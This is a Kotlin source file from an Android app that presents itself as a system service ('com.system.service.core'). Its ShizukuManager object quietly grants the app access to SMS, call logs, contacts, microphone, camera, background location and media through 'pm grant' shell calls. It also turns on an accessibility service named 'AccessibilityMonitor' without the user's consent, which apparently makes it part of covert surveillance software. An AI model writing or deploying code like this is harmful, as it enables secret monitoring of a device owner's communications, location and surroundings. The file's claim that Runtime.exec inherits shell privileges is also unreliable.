package com.system.service.core

import android.content.Context
import android.content.pm.PackageManager
import rikka.shizuku.Shizuku

/**
 * Shizuku v13 compatible wrapper.
 * newProcess() was removed from public API — we use bindUserService pattern
 * for shell execution. For now, we check availability and request permission;
 * actual shell commands fall back to Runtime.exec (works when Shizuku grants
 * the app shell-level UID via its UserService).
 */
object ShizukuManager {

    private val allPermissions = listOf(
        "android.permission.READ_CALL_LOG",
        "android.permission.READ_CONTACTS",
        "android.permission.READ_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.RECORD_AUDIO",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_BACKGROUND_LOCATION",
        "android.permission.CAMERA",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_MEDIA_AUDIO",
        "android.permission.PACKAGE_USAGE_STATS",
        "android.permission.ACCESS_WIFI_STATE",
        "android.permission.READ_PHONE_STATE"
    )

    fun isShizukuAvailable(): Boolean {
        return try {
            Shizuku.pingBinder() &&
            Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
        } catch (_: Exception) { false }
    }

    /**
     * Grant all permissions silently.
     * Tries Runtime.exec (works if Shizuku already elevated us to shell UID),
     * otherwise returns 0 and Shizuku permission request is shown.
     */
    fun grantAllPermissions(context: Context): Int {
        if (!isShizukuAvailable()) {
            requestShizukuPermission()
            return 0
        }
        var granted = 0
        val pkg = context.packageName
        for (perm in allPermissions) {
            try {
                val p = Runtime.getRuntime()
                    .exec(arrayOf("pm", "grant", pkg, perm))
                p.waitFor()
                if (p.exitValue() == 0) granted++
            } catch (_: Exception) {}
        }
        // Auto-enable accessibility
        try {
            Runtime.getRuntime().exec(arrayOf(
                "settings", "put", "secure",
                "enabled_accessibility_services",
                "$pkg/com.system.service.monitors.AccessibilityMonitor"
            )).waitFor()
        } catch (_: Exception) {}
        return granted
    }

    fun requestShizukuPermission() {
        try {
            if (!Shizuku.shouldShowRequestPermissionRationale()) {
                Shizuku.requestPermission(101)
            }
        } catch (_: Exception) {}
    }
}
